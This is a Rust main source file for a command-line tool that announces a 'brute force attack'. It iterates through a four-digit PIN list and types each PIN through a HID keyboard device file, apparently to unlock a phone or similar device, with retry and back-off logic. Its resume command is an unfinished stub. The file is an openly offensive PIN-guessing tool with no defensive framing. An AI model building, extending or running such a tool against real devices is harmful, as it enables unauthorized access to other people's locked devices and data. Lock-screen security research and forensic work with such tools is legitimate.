use clap::Parser;
use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings, KEYBOARD_DEVICE};
use log::{debug, error, info, trace, warn, LevelFilter};
use simple_logger::SimpleLogger;
use std::{process::exit, thread, time};

mod common;
mod hid;
mod pin_lists;

fn main() {
    let cli = Cli::parse();
    let mut logger = SimpleLogger::new();

    logger = match cli.verbose {
        0 => logger.with_level(LevelFilter::Info),
        1 => logger.with_level(LevelFilter::Debug),
        _ => logger.with_level(LevelFilter::Trace),
    };

    logger.env().init().unwrap();

    let settings = parse_cli_args(&cli);

    debug!("Starting app...");

    match cli.command {
        Some(Commands::Start) => start(settings),
        Some(Commands::Resume(args)) => resume(settings, args),
        None => {
            error!("No command provided. Use --help for usage information.");
            exit(1);
        }
    }

    debug!("Finished app...");
}

fn start(settings: Settings) {
    info!("Starting brute force attack...");

    let mut cool_down_index = 0;

    for pin in pin_lists::PIN_LIST_4 {
        let mut result = hid::write_to_device_file(KEYBOARD_DEVICE, pin);
        let mut attempts = 30;

        while let Err(e) = result {
            attempts -= 1;
            warn!("Failed to send pin: {}", pin);
            debug!("Attempts remaining: {}", attempts);
            trace!("Error: {}", e);

            if attempts == 0 {
                error!("30 failed attempts, exiting...");
                exit(126); // Command invoked cannot execute
            }

            // Wait for 10 seconds before trying again
            thread::sleep(time::Duration::from_millis(10000));

            result = hid::write_to_device_file(KEYBOARD_DEVICE, pin);
        }
    }
}

fn resume(settings: Settings, args: ResumeArgs) {
    info!("Resuming brute force attack from pin: {}", args.pin);
    // let result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, "Hello World");
    // match result {
    //     Ok(_) => info!("Brute force attack complete"),
    //     Err(e) => error!("Failed to start brute force attack: {}", e),
    // }
}
